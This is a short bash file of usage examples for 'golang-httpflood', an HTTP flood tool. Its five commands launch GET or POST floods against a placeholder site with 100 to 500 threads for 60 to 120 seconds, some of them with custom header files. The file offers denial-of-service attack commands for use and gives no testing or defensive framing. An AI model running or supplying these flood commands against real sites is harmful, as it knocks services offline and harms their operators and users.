#!/bin/bash
# Basic usage examples for golang-httpflood

# Example 1: Simple GET flood with default headers
./httpflood https://example.com 100 get 60 nil

# Example 2: GET flood with more threads
./httpflood https://example.com 500 get 120 nil

# Example 3: POST flood with default headers
./httpflood https://example.com 100 post 60 nil

# Example 4: GET flood with custom headers
./httpflood https://example.com 100 get 60 configs/headers/default.txt

# Example 5: POST flood with custom headers and data
./httpflood https://example.com 200 post 60 configs/headers/custom.txt